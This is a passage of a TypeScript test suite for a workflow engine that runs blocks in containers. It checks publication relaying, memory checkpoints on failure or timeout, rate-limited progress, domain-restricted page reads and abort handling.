      const relayed: unknown[] = [];
      b.infra.onPublish = async (p) => {
        relayed.push(p);
      };
      const r = await runWorkflow(b.ctx, b.infra);
      expect(r.issue).toMatchObject({ t: "end", output: { value: "finale" } });
      return relayed;
    };

    expect(await launchWith(watch({ live: true }))).toEqual([
      { data: "A", done: 1, total: 3 },
      { data: "C", done: 2, total: 3 },
      { data: "D", done: 3, total: 3 },
    ]);
    expect(await launchWith(watch({ live: true }), attempt)).toEqual([]);
    expect(await launchWith(watch(), (b) => void (b.ctx.maxDurationMinutes = 30))).toEqual([]);
  });

  it("a slow surPublication is finished before executerWorkflow returns", async () => {
    const b = await bench(watch({ live: true }));
    const advance = fakeClock(b);
    b.infra.launch = launcherSteps([
      blockStart("liste"), blockEnd("liste"), blockStart("fiche"), blockStart("avis"),
      pub("A", 1, 2), advance(5000), pub("B", 2, 2),
      blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
      { t: "end", data: "finale" },
    ]);
    const finished: unknown[] = [];
    let running = 0;
    let atMost = 0;
    b.infra.onPublish = async (p) => {
      running++;
      atMost = Math.max(atMost, running);
      await new Promise((ok) => setTimeout(ok, 80));
      finished.push(p.data);
      running--;
    };
    const r = await runWorkflow(b.ctx, b.infra);
    expect(finished).toEqual(["A", "B"]);
    expect(atMost).toBe(1);
    expect(r.issue).toMatchObject({ t: "end", output: { value: "finale" } });
  });

  it("progressive: surMemoire at most every 30 s; an echec carries the last memory received; non-progressive: neither surMemoire nor memoire in the outcome", async () => {
    // The hash of the validated parameters (defaults included) of the liste block.
    const hash = paramsHash(valid(watch()).workflow.blocks.find((x) => x.id === "liste")!.params);
    const m = (n: number) => ({ t: "memory", memory: { liste: { type: "code", value: n }, unknown: { type: "code", value: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", value: n, hash: hash } });
    const launchWith = async (d: number | undefined, end: unknown = { t: "failure", error: "cassé" }) => {
      const b = await bench(watch());
      if (d !== undefined) b.ctx.maxDurationMinutes = d;
      const advance = fakeClock(b);
      b.infra.launch = launcherSteps([m(1), advance(10_000), m(2), advance(25_000), m(3), m(4), end]);
      const relayed: unknown[] = [];
      b.infra.onMemory = async (x) => {
        relayed.push(x);
      };
      const r = await runWorkflow(b.ctx, b.infra);
      return { r, relayed: relayed };
    };

    const prog = await launchWith(30);
    expect(prog.relayed).toEqual([marquee(1), marquee(3)]);
    expect(prog.r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(4) });

    const without = await launchWith(undefined);
    expect(without.relayed).toEqual([]);
    expect(without.r.issue).toEqual({ t: "failure", error: "cassé", codeError: true });

    // A fin keeps the memory as today.
    const end = await launchWith(30, { t: "end", data: null });
    expect(end.r.issue).toMatchObject({ t: "end", memory: marquee(4) });
  });

  it("progressive: a stop (timeout) carries the last memory received; a memory still held (nothing received after) does not count; non-progressive: none", async () => {
    // The hash of the validated parameters (defaults included) of the liste block.
    const hash = paramsHash(valid(watch()).workflow.blocks.find((x) => x.id === "liste")!.params);
    const launchWith = async (d: number | undefined) => {
      const b = await bench(watch(), {}, { delayMs: 300 });
      if (d !== undefined) b.ctx.maxDurationMinutes = d;
      b.infra.launch = launcherSteps(
        [
          { t: "memory", memory: { liste: { type: "code", value: 7 } } },
          { t: "log", block: "liste", text: "suite" },
          // Held until the next line, which never arrives: it could precede a publication never read.
          { t: "memory", memory: { liste: { type: "code", value: 8 } } },
        ],
        { blocked: true },
      );
      return (await runWorkflow(b.ctx, b.infra)).issue;
    };
    expect(await launchWith(30)).toEqual({ t: "stop", status: "error", error: "Délai dépassé", memory: { liste: { type: "code", value: 7, hash: hash } } });
    expect(await launchWith(undefined)).toEqual({ t: "stop", status: "error", error: "Délai dépassé" });
  });

  describe("the memory that precedes a publication follows its fate (R34)", () => {
    const hash = () => paramsHash(valid(watch()).workflow.blocks.find((x) => x.id === "liste")!.params);
    const mem = (n: number) => ({ t: "memory", memory: { liste: { type: "code", value: n } } });
    const marquee = (n: number) => ({ liste: { type: "code", value: n, hash: hash() } });
    const openChain = [blockStart("liste"), blockEnd("liste"), blockStart("fiche"), blockStart("avis")];
    const launchWith = async (step: (advance: (ms: number) => () => void) => unknown[]) => {
      const b = await bench(watch({ live: true }));
      const advance = fakeClock(b);
      b.infra.launch = launcherSteps(step(advance));
      const published: unknown[] = [];
      const memories: unknown[] = [];
      b.infra.onPublish = async (p) => void published.push(p.data);
      b.infra.onMemory = async (m) => void memories.push(m);
      const r = await runWorkflow(b.ctx, b.infra);
      return { issue: r.issue, published: published, memories: memories };
    };

    it("a publication over 2 MB followed by an echec: the outcome carries the earlier memory, even after other memories", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(5000), mem(2), pub("x".repeat(2 * 1024 * 1024 + 10), 2, 3),
        // Sent next by the container (verifierMemoire, before echec): it still retains the keys of the rejected publication.
        advance(40_000), mem(3),
        { t: "failure", error: "cassé" },
      ]);
      expect(r.published).toEqual(["A"]);
      expect(r.memories).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(1) });
    });

    it("a publication accepted after a rejected one puts the memory back on track", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(5000), mem(2), pub("faits > total", 4, 3),
        advance(1000), mem(3), pub("B", 2, 3),
        mem(4),
        { t: "failure", error: "cassé" },
      ]);
      expect(r.published).toEqual(["A", "B"]);
      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(4) });
    });

    it("two publications in the same stdout chunk: the second is rejected and its memory dropped", async () => {
      const line = (x: unknown) => JSON.stringify(x) + "\n";
      const r = await launchWith(() => [
        ...openChain,
        line(mem(1)) + line(pub("A", 1, 3)) + line(mem(2)) + line(pub("B", 2, 3)) + line({ t: "failure", error: "cassé" }),
      ]);
      expect(r.published).toEqual(["A"]);
      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(1) });
    });

    it("a fin keeps the last memory received, as before (the output shows everything)", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(1000), mem(2), pub("trop tôt", 2, 3),
        blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
        mem(3),
        { t: "end", data: "finale" },
      ]);
      expect(r.issue).toMatchObject({ t: "end", memory: marquee(3) });
    });

    it("F1: a publication's data is written before the memory it makes safe", async () => {
      const b = await bench(watch({ live: true }));
      b.infra.launch = launcherSteps([...openChain, mem(1), pub("A", 1, 3), { t: "failure", error: "cassé" }]);
      const written: string[] = [];
      b.infra.onPublish = async (p) => {
        await new Promise((ok) => setTimeout(ok, 20));
        written.push(`data ${p.data}`);
      };
      b.infra.onMemory = async (m) => void written.push(`memory ${m.liste?.value}`);
      const r = await runWorkflow(b.ctx, b.infra);
      expect(written).toEqual(["data A", "memory 1"]);
      expect(r.issue).toMatchObject({ memory: marquee(1) });
    });

    it("F1: a refused data write leaves the memory doubtful until the next written publication", async () => {
      const launch = async (step: unknown[]) => {
        const b = await bench(watch({ live: true }));
        const advance = fakeClock(b);
        b.infra.launch = launcherSteps(step.map((p) => (p === "avancer" ? advance(5000) : p)));
        const memories: unknown[] = [];
        b.infra.onPublish = async (p) => {
          if (p.data === "refusee") throw new Error("disque plein");
        };
        b.infra.onMemory = async (m) => void memories.push(m);
        const r = await runWorkflow(b.ctx, b.infra);
        return { issue: r.issue, memories: memories };
      };
      const denied = await launch([...openChain, mem(1), pub("refusee", 1, 3), mem(2), { t: "log", block: "fiche", text: "x" }, { t: "failure", error: "cassé" }]);
      expect(denied.memories).toEqual([]);
      expect(denied.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: null });
      const resume = await launch([...openChain, mem(1), pub("refusee", 1, 3), "avancer", mem(2), pub("B", 2, 3), mem(3), { t: "failure", error: "cassé" }]);
      expect(resume.memories).toEqual([marquee(2)]);
      expect(resume.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(3) });
    });

    it("a memory after the output block's end, then fin: neither relayed nor safe, it only serves the fin outcome", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(40_000),
        blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
        mem(2),
        { t: "end", data: "finale" },
      ]);
      expect(r.memories).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "end", memory: marquee(2) });
    });

    it("a memory followed by fin is not relayed, even without an output end trace", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(40_000), mem(2),
        { t: "end", data: "finale" },
      ]);
      expect(r.memories).toEqual([marquee(1)]);
      expect(r.issue).toMatchObject({ t: "end", memory: marquee(2) });
    });

    it("a memory after the output block's end, then echec: the outcome keeps the earlier safe memory", async () => {
      const r = await launchWith((advance) => [
        ...openChain,
        mem(1), pub("A", 1, 3),
        advance(40_000),
        blockEnd("fiche"), blockEnd("avis"), blockStart("sortie"), blockEnd("sortie"),
        mem(2), { t: "log", block: "sortie", text: "après" },
        { t: "failure", error: "cassé" },
      ]);
      expect(r.memories).toEqual([marquee(1)]);
      expect(r.issue).toEqual({ t: "failure", error: "cassé", codeError: true, memory: marquee(1) });
    });
  });

  it("interpreter.mjs's DATA_MAX_SIZE equals the kernel's, re-exported by accueil", async () => {
    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreter.mjs")).href);
    expect(interpreter.DATA_MAX_SIZE).toBe(DATA_MAX_SIZE);
    expect(HOME_DATA_MAX_SIZE).toBe(DATA_MAX_SIZE);
    expect(DATA_MAX_SIZE).toBe(2 * 1024 * 1024);
  });

  it("run.ts's PUBLICATIONS_GAP_MS and MEMORY_GAP_MS equal those of interpreter.mjs", async () => {
    const interpreter = await import(pathToFileURL(join(ENGINE, "interpreter.mjs")).href);
    expect(PUBLICATIONS_GAP_MS).toBe(5000);
    expect(MEMORY_GAP_MS).toBe(30_000);
    expect(interpreter.PUBLICATIONS_GAP_MS).toBe(PUBLICATIONS_GAP_MS);
    expect(interpreter.MEMORY_GAP_MS).toBe(MEMORY_GAP_MS);
  });
});

describe("executerWorkflow: input, progress, reads and stop (actions)", () => {
  /** A fake container: writes its lines, then waits to be killed (`bloque`) or exits with 0. `recu`: what it receives. */
  const launcherLines = (lines: unknown[], o: { received?: string[]; blocked?: boolean; killed?: () => void } = {}): ProcessLauncher => () => {
    const stdout = new PassThrough();
    const stderr = new PassThrough();
    const stdin = new PassThrough();
    stdin.on("data", (d: Buffer) => o.received?.push(d.toString()));
    let kill = () => {};
    const end = new Promise<number | null>((ok) => {
      kill = () => {
        o.killed?.();
        stdout.end();
        stderr.end();
        ok(null);
      };
      setImmediate(() => {
        for (const l of lines) stdout.write(JSON.stringify(l) + "\n");
        if (o.blocked) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      });
    });
    return { stdin, stdout, stderr, kill: () => kill(), end: end };
  };

  it("a widget's debut line is identical to before (snapshot)", async () => {
    const received: string[] = [];
    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "end", data: null }], { received: received }) });
    await runWorkflow(b.ctx, b.infra);
    const workflow = JSON.stringify({ blocks: b.ctx.valid.workflow.blocks, links: b.ctx.valid.workflow.links, order: ["a", "sortie"] });
    expect(received.join("").split("\n")[0]).toBe(
      `{"t":"start","previous":null,"now":"2026-10-29T10:00:00.000Z","config":{"interests":"rust"},"workflow":${workflow}}`,
    );
  });

  it("an action sends saisie and avancement in debut", async () => {
    const received: string[] = [];
    const owners: unknown[] = [];
    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "end", data: [] }], { received: received }) });
    b.ctx.owner = { type: "action", id: "leboncoin" };
    b.ctx.input = "clio lyon";
    b.ctx.progress = true;
    b.infra.workshop.harvestCommand = (p, d, m) => (owners.push(p), ["docker", "run", nameOf(p), d, m]);
    const r = await runWorkflow(b.ctx, b.infra);
    const start = JSON.parse(received.join("").split("\n")[0]!);
    expect(start).toMatchObject({ t: "start", input: "clio lyon", progress: true });
    expect(r.run).toMatchObject({ owner: { type: "action", id: "leboncoin" }, input: "clio lyon" });
    // The workshop receives the whole owner: an action's container has its own name.
    expect(owners).toEqual([{ type: "action", id: "leboncoin" }]);
  });

  it("a lirePage of https://gitlab.com/x emits lecture « gitlab.com » on the current block", async () => {
    const bridge = new FakeBridge([], { active: null, allow: false, read: { pages: [{ url: "https://gitlab.com/x", title: "X", text: "", links: [] }] } });
    const b = await bench(
      chain("a", "b"),
      {
        "a.mjs": `export default async () => 1;`,
        "b.mjs": `export default async (e, w) => (await w.readPage("https://gitlab.com/x")).title;`,
      },
      { bridge: bridge },
    );
    b.ctx.owner = { type: "action", id: "gitlab" };
    const relayed: DirectTrace[] = [];
    b.infra.onTrace = (t) => relayed.push(t);
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: "X" } });
    expect(relayed).toEqual([
      { block: "a", step: "start" },
      { block: "a", step: "end", status: "succeeded", items: null },
      { block: "b", step: "start" },
      { block: "b", step: "read", host: "gitlab.com" },
      { block: "b", step: "end", status: "succeeded", items: null },
      { block: "sortie", step: "start" },
      { block: "sortie", step: "end", status: "succeeded", items: null },
    ]);
  });

  it("a refused read (undeclared domain) emits no lecture", async () => {
    const b = await bench(chain("a"), { "a.mjs": `export default async (e, w) => { try { await w.readPage("https://tiers.example/"); } catch { return "refusée"; } };` }, { account: ["gitlab.com"], public: [] });
    const relayed: DirectTrace[] = [];
    b.infra.onTrace = (t) => relayed.push(t);
    const r = await runWorkflow(b.ctx, b.infra);
    expect(r.issue).toMatchObject({ t: "end", output: { value: "refusée" } });
    expect(relayed.some((t) => t.step === "read")).toBe(false);
  });

  it("signal raised: container killed, status interrompue, error ACTION_STOPPED, erreurNoyau", async () => {
    let tue = 0;
    const stop = new AbortController();
    const b = await bench(chain("a"), {}, { launch: launcherLines([{ t: "block", id: "a", step: "start" }], { blocked: true, killed: () => tue++ }) });
    b.ctx.owner = { type: "action", id: "gitlab" };
    b.ctx.signal = stop.signal;
    b.infra.onTrace = (t) => {
      if (t.step === "start") setImmediate(() => stop.abort());
    };
    const r = await runWorkflow(b.ctx, b.infra);
    expect(tue).toBe(1);
    expect(r.issue).toEqual({ t: "stop", status: "error", error: ACTION_STOPPED });
    expect(r.run).toMatchObject({ status: "interrupted", error: ACTION_STOPPED, kernelError: true });
    expect(r.run.blocks[0]!.status).toBe("interrupted");
    expect(b.deleted).toEqual(["action:gitlab", "action:gitlab"]);
  });

  it("an already-raised signal: nothing is launched, run interrupted", async () => {
    const stop = new AbortController();
    stop.abort();
    const b = await bench(chain("a"));
    b.ctx.signal = stop.signal;
    const r = await runWorkflow(b.ctx, b.infra);
    expect(b.commands).toEqual([]);
    expect(r.run).toMatchObject({ status: "interrupted", error: ACTION_STOPPED, kernelError: true });
  });

  it("an avancement line with faits > total is rejected", async () => {
    const b = await bench(chain("a"), {}, {
      launch: launcherLines([
        { t: "block", id: "a", step: "start" },
        { t: "block", id: "a", step: "progress", done: 3, total: 2 },
        { t: "block", id: "a", step: "progress", done: -1, total: 2 },
        { t: "block", id: "sortie", step: "progress", done: 1, total: 2 },
        { t: "block", id: "a", step: "progress", done: 2, total: 2 },
        { t: "block", id: "a", step: "end", status: "succeeded", output: [1, 2] },
        { t: "block", id: "a", step: "progress", done: 2, total: 2 },
        { t: "block", id: "sortie", step: "start" },
        { t: "block", id: "sortie", step: "end", status: "succeeded", output: [1, 2] },
        { t: "end", data: [1, 2] },
      ]),
    });
    b.ctx.progress = true;
    const relayed: DirectTrace[] = [];
    b.infra.onTrace = (t) => relayed.push(t);
    await runWorkflow(b.ctx, b.infra);
    // Only that of the current block, with faits ≤ total, passes; an avancement outside its block is ignored.
    expect(relayed.filter((t) => t.step === "progress")).toEqual([{ block: "a", step: "progress", done: 2, total: 2 }]);
  });

  it("progress: at most one per PROGRESS_GAP_MS and per block, the last (faits = total) always; ignored without avancement", async () => {
    let t = 0;
    const lines = [
      { t: "block", id: "a", step: "start" },
      ...[1, 2, 3, 4].map((done) => ({ t: "block", id: "a", step: "progress", done: done, total: 4 })),
      { t: "block", id: "a", step: "end", status: "succeeded", output: [] },
      { t: "block", id: "sortie", step: "start" },
      { t: "block", id: "sortie", step: "end", status: "succeeded", output: [] },
      { t: "end", data: [] },
    ];
    const updateEntry = await bench(chain("a"), {}, { launch: launcherLines(lines) });
    updateEntry.ctx.progress = true;
    // 300 ms between two received lines.
    updateEntry.infra.clock = () => new Date(NOW.getTime() + (t += 300));
    const relayed: DirectTrace[] = [];
    updateEntry.infra.onTrace = (x) => relayed.push(x);
    await runWorkflow(updateEntry.ctx, updateEntry.infra);
    const done = relayed.flatMap((x) => (x.step === "progress" ? [x.done] : []));
    expect(done[0]).toBe(1);
    expect(done.at(-1)).toBe(4);
    expect(done.length).toBeLessThan(4);

    const without = await bench(chain("a"), {}, { launch: launcherLines(lines) });
    const relayees2: DirectTrace[] = [];
    without.infra.onTrace = (x) => relayees2.push(x);
    await runWorkflow(without.ctx, without.infra);
    expect(relayees2.some((x) => x.step === "progress")).toBe(false);
  });
});
